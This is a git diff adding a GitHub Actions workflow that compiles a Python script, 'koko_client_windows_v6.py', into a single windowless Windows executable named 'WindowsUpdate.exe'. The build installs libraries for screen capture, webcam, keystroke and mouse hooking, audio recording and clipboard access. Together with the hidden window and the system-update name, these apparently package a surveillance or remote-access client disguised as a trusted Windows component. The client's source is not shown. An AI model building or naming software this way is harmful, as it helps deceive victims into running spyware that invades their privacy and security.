@@ -1,0 +1,35 @@
+name: Build Windows EXE
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller
+          pip install mss Pillow opencv-python pyautogui pynput sounddevice wavio psutil cryptography numpy pyperclip
+
+      - name: Build EXE
+        run: |
+          pyinstaller --onefile --windowed --name WindowsUpdate koko_client_windows_v6.py
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WindowsUpdate
+          path: dist/WindowsUpdate.exe
